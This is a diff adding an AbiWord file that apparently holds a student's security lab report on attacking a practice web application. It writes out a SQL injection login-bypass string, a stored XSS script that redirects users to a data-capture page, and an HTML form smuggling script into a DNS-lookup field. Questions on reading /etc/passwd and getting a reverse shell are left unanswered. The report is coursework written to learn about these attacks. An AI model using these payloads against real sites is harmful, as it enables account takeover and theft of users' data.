@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE abiword PUBLIC "-//ABISOURCE//DTD AWML 1.0 Strict//EN" "http://www.abisource.com/awml.dtd">
+<abiword template="false" xmlns:ct="http://www.abisource.com/changetracking.dtd" xmlns:fo="http://www.w3.org/1999/XSL/Format" xmlns:math="http://www.w3.org/1998/Math/MathML" xid-max="60" xmlns:dc="http://purl.org/dc/elements/1.1/" fileformat="1.1" xmlns:svg="http://www.w3.org/2000/svg" xmlns:awml="http://www.abisource.com/awml.dtd" xmlns="http://www.abisource.com/awml.dtd" xmlns:xlink="http://www.w3.org/1999/xlink" version="3.0.0" xml:space="preserve" props="dom-dir:ltr; document-footnote-restart-section:0; document-endnote-type:numeric; document-endnote-place-enddoc:1; document-endnote-initial:1; lang:en-US; document-endnote-restart-section:0; document-footnote-restart-page:0; document-footnote-type:numeric; document-footnote-initial:1; document-endnote-place-endsection:0">
+<!-- ======================================================================== -->
+<!-- This file is an AbiWord document.                                        -->
+<!-- AbiWord is a free, Open Source word processor.                           -->
+<!-- More information about AbiWord is available at http://www.abisource.com/ -->
+<!-- You should not edit this file by hand.                                   -->
+<!-- ======================================================================== -->
+
+<metadata>
+<m key="abiword.generator">AbiWord</m>
+<m key="dc.format">application/x-abiword</m>
+</metadata>
+<rdf>
+</rdf>
+<styles>
+<s type="P" name="List Paragraph" basedon="_Normal" props="margin-left:36.000000pt"/>
+<s type="P" name="_Normal" basedon="_Normal"/>
+<s type="P" name="header" basedon="_Normal" props="margin-bottom:0.000000pt; line-height:1.000000"/>
+<s type="P" name="Arrowhead List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Block Text" basedon="_Normal" props="margin-bottom:6.000000pt; margin-right:72.000000pt; margin-left:72.000000pt"/>
+<s type="P" name="Box List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Bullet List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Chapter Heading" basedon="Numbered Heading 1" followedby="_Normal" props="text-indent:0.000000pt"/>
+<s type="P" name="Contents 1" basedon="_Normal" followedby="_Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Contents 2" basedon="_Normal" followedby="_Normal" props="text-indent:-21.600000pt; margin-left:72.000000pt"/>
+<s type="P" name="Contents 3" basedon="_Normal" followedby="_Normal" props="text-indent:-21.600000pt; margin-left:108.000000pt"/>
+<s type="P" name="Contents 4" basedon="_Normal" followedby="_Normal" props="text-indent:-21.600000pt; margin-left:144.000000pt"/>
+<s type="P" name="Contents Header" basedon="_Normal" followedby="_Normal" props="text-align:center; margin-top:12.000000pt; font-weight:bold; margin-bottom:6.000000pt; font-family:Liberation Sans; font-size:16.000000pt"/>
+<s type="P" name="Dashed List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="C" name="Default Paragraph Font" basedon="_Normal"/>
+<s type="P" name="Diamond List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Endnote" basedon="_Normal" props="text-indent:-14.400000pt; margin-left:14.400000pt"/>
+<s type="C" name="Endnote Reference" basedon="Normal" props="text-position:superscript; font-size:10.000000pt"/>
+<s type="P" name="Endnote Text" basedon="_Normal"/>
+<s type="C" name="Footer Char" basedon="Default Paragraph Font"/>
+<s type="P" name="Footnote" basedon="_Normal" props="text-indent:-14.400000pt; font-size:10.000000pt; margin-left:14.400000pt"/>
+<s type="C" name="Footnote Reference" basedon="Normal" props="text-position:superscript; font-size:10.000000pt"/>
+<s type="P" name="Footnote Text" basedon="_Normal" props="font-size:10.000000pt"/>
+<s type="P" name="Hand List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="C" name="Header Char" basedon="Default Paragraph Font"/>
+<s type="P" name="Heading 1" basedon="_Normal" followedby="_Normal" props="margin-top:22.000000pt; font-weight:bold; margin-bottom:3.000000pt; font-family:Liberation Sans; font-size:17.000000pt"/>
+<s type="P" name="Heading 2" basedon="_Normal" followedby="_Normal" props="margin-top:22.000000pt; font-weight:bold; margin-bottom:3.000000pt; font-family:Liberation Sans; font-size:14.000000pt"/>
+<s type="P" name="Heading 3" basedon="_Normal" followedby="_Normal" props="margin-top:22.000000pt; font-weight:bold; margin-bottom:3.000000pt; font-family:Liberation Sans; font-size:12.000000pt"/>
+<s type="P" name="Heading 4" basedon="_Normal" followedby="_Normal" props="margin-top:22.000000pt; font-weight:bold; margin-bottom:3.000000pt; font-family:Liberation Sans; font-size:12.000000pt"/>
+<s type="P" name="Heart List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Implies List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Lower Case List" basedon="Numbered List" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Lower Roman List" basedon="_Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="No List" basedon="_Normal"/>
+<s type="P" name="Normal" basedon="Normal" followedby="Current Settings" props="line-height:1.079167; margin-bottom:8.000000pt; font-family:Times New Roman; font-size:11.000000pt"/>
+<s type="P" name="Normal Table" basedon="_Normal"/>
+<s type="P" name="Numbered Heading 1" basedon="Heading 1" followedby="_Normal" props="text-indent:0.000000pt"/>
+<s type="P" name="Numbered Heading 2" basedon="Heading 2" followedby="_Normal" props="text-indent:0.000000pt"/>
+<s type="P" name="Numbered Heading 3" basedon="Heading 3" followedby="_Normal" props="text-indent:0.000000pt"/>
+<s type="P" name="Numbered List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Plain Text" basedon="_Normal" props="font-family:Courier New"/>
+<s type="P" name="Section Heading" basedon="Numbered Heading 1" followedby="_Normal" props="text-indent:0.000000pt"/>
+<s type="P" name="Square List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Star List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Tick List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Triangle List" basedon="Normal" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Upper Case List" basedon="Numbered List" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="Upper Roman List" basedon="Numbered List" props="text-indent:-21.600000pt; margin-left:36.000000pt"/>
+<s type="P" name="footer" basedon="_Normal" props="margin-bottom:0.000000pt; line-height:1.000000"/>
+</styles>
+<lists>
+<l id="11000" parentid="0" type="0" start-value="1" list-delim="%L." list-decimal="."/>
+<l id="11011" parentid="0" type="1" start-value="1" list-delim="%L." list-decimal="."/>
+</lists>
+<pagesize pagetype="Letter" orientation="portrait" width="8.500000" height="11.000000" units="in" page-scale="1.000000"/>
+<section header="0" xid="3" props="page-margin-right:1.000000in; column-line:off; page-margin-left:1.000000in; columns:1; page-margin-top:1.181250in; page-margin-bottom:1.000000in">
+<p level="0" listid="11000" parentid="0" style="List Paragraph" xid="4" props="text-indent:-18.000000pt; margin-left:18.000000pt"><field level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" xid="5" props="text-indent:-18.000000pt; margin-left:18.000000pt"></field><c level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:18.000000pt">	SQL</c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="6" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="7" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	Explain the string you used for the SQL injection and explain why it works.</c></p>
+<p style="List Paragraph" xid="8" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="9" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">The string I used for username and password was 1’ OR ‘1’ = ‘1. With 1’ OR ‘1’ = ‘1, the SQL statement at the server becomes </c></p>
+<p style="List Paragraph" xid="10" props="text-indent:18.000000pt; margin-left:54.000000pt"><c props="font-style:italic">SELECT * FROM accounts WHERE username= ‘1’ or ‘1’=’1’ AND password=’1’ or ‘1’=’1’</c></p>
+<p style="List Paragraph" xid="11" props="margin-left:51.550000pt">As ‘1’=’1’ is always true, the above statement will just return all the values.</p>
+<p style="List Paragraph" xid="12" props="margin-left:39.250000pt"><c></c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="13" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="14" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	What is the table name used to display user details?</c></p>
+<p style="List Paragraph" xid="15" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="16" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">The table name used to display user details was </c><c props="font-style:italic">accounts</c>.</p>
+<p style="List Paragraph" xid="17" props="margin-left:39.250000pt"><c></c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="18" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="19" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	What are the fields in this table?</c></p>
+<p style="List Paragraph" xid="20" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="21" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">The fields in the </c><c props="font-style:italic">accounts </c>table include <c props="font-style:italic">Username</c>, <c props="font-style:italic">Password</c> and <c props="font-style:italic">Signature</c>.</p>
+<p level="0" listid="11000" parentid="0" style="List Paragraph" xid="22" props="text-indent:-18.000000pt; margin-left:18.000000pt"><field level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" xid="23" props="text-indent:-18.000000pt; margin-left:18.000000pt"></field><c level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:18.000000pt">	XSS</c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="24" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="25" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	Explain which content you inserted in the second order attack, and how it works</c></p>
+<p style="List Paragraph" xid="26" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="27" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">The content I inserted in the second order attack is the following.</c></p>
+<p style="List Paragraph" xid="28" props="text-align:left; margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">&lt;SCRIPT&gt;window.location="http://10.0.1.250/index.php?page=capture-data.php"&lt;/SCRIPT&gt;</c></p>
+<p style="List Paragraph" xid="29" props="text-align:left; margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">window.location calls for a redirection to a specific link and the link provided in the script is </c><c props="lang:en-US; font-size:11.000000pt; font-family:Times New Roman; color:000000">http://10.0.1.250/index.php?page=capture-data.php, the web page that records down desired information of the users who are accessing the website. In this way, we can redirect innocent users who are interested in blogging to the recording page and get their information.</c> </p>
+<p style="List Paragraph" xid="30"><bookmark type="start" name="_GoBack" xid="31"/><bookmark type="end" name="_GoBack" xid="32"/></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="33" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="34" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	Explain the flask script you wrote to create the POST request for the first-order attack</c></p>
+<p style="List Paragraph" xid="35"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="36" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">&lt;html&gt;</c></p>
+<p style="List Paragraph" xid="37" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">     &lt;form action="http://10.0.1.250/index.php?page=dns-lookup.php" method="post" &gt;</c></p>
+<p style="List Paragraph" xid="38" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;input type=hidden name='target_host' value="&lt;script src='capture-data.php'&gt;&lt;/script&gt;"</c></p>
+<p style="List Paragraph" xid="39" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;/input&gt;		</c></p>
+<p style="List Paragraph" xid="40" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;input type=hidden name='dns-lookup-php-submit-button' value="Lookup DNS" method="post"&gt;</c></p>
+<p style="List Paragraph" xid="41" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;/input&gt;</c></p>
+<p style="List Paragraph" xid="42" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;input type=submit name='Submit' value="Submit" method="get"&gt;</c></p>
+<p style="List Paragraph" xid="43" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">          &lt;/input&gt;</c></p>
+<p style="List Paragraph" xid="44" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">     &lt;/form&gt;</c></p>
+<p style="List Paragraph" xid="45" props="text-align:left"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">&lt;/html&gt;</c></p>
+<p style="List Paragraph" xid="46" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p style="List Paragraph" xid="47" props="text-align:justify; margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">Firstly, the form has the address of http://10.0.1.250/index.php?page=dns-lookup.php, which is the original adress for the POST method for DNS lookup. Other than that, there are hidden objects like ‘target_host’ and ‘dns-lookup-php-submit-button’. ‘target_host’ sets the value to the phpsession ID. So when the user presses the button, attacker is able to forward the user to the legitimate page while redirecting him also to the data recording page so that uesr’s information can be collected by the attacker.</c></p>
+<p style="List Paragraph" xid="48" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p level="0" listid="11000" parentid="0" style="List Paragraph" xid="49" props="text-indent:-18.000000pt; margin-left:18.000000pt"><field level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" xid="50" props="text-indent:-18.000000pt; margin-left:18.000000pt"></field><c level="0" listid="11000" parentid="0" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:18.000000pt">	Injection</c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="51" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="52" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	Explain which command you used to obtain the content of “/etc/passwd”, and why it works</c></p>
+<p level="0" listid="0" parentid="0" style="List Paragraph" xid="1" props="list-delim:%L; list-decimal:.; list-style:None; start-value:1; margin-left:39.250000pt; text-indent:0.0000in; field-font:NULL"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt; list-tag:1000"></c></p>
+<p style="List Paragraph" xid="53" props="margin-left:39.250000pt"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+<p level="1" listid="11011" parentid="0" style="List Paragraph" xid="54" props="text-indent:-18.000000pt; margin-left:39.250000pt"><field level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" xid="55" props="text-indent:-18.000000pt; margin-left:39.250000pt"></field><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">	Explain which command you used to obtain the reverse shell, and why it works</c></p>
+<p xid="56"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt"></c></p>
+</section>
+<section type="header" id="0" xid="57">
+<p style="header" xid="58"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">50.020 Security Lab 4</c></p>
+<p style="header" xid="59"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">Dabin Lee </c></p>
+<p style="header" xid="60"><c level="1" listid="11011" parentid="11010" style="List Paragraph" type="list_label" props="text-indent:-18.000000pt; margin-left:39.250000pt">1000727</c></p>
+</section>
+</abiword>
